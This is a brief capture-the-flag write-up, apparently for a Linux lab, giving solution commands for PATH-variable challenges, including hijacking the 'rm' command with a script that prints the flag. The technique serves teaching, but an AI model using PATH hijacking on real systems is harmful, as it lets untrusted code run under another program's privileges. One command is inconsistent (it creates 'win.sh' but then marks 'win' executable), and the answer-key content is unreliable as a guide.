# The PATH Variable
Get the flag by using `PATH="" /challenge/run`

# Setting PATH
Set Path by ` PATH=/challenge/more_commands/` then ran `/challenge/run win` to get the flag

# Adding Commands
First ran `echo "cat /flag" > win.sh` to store `cat /flag` in `win` then `chmod +x win` to change permissions `export PATH=./:$PATH` to add path of `win` to the `PATH` then use `/challenge/run` to get the flag

# Hijacking Commnads
Ran `echo "cat /flag" > rm` after which I changed file permissions by `chmod +x rm` added `PATH` of `rm` by `export PATH=./:$PATH` then use `/challenge/run` to get the flag
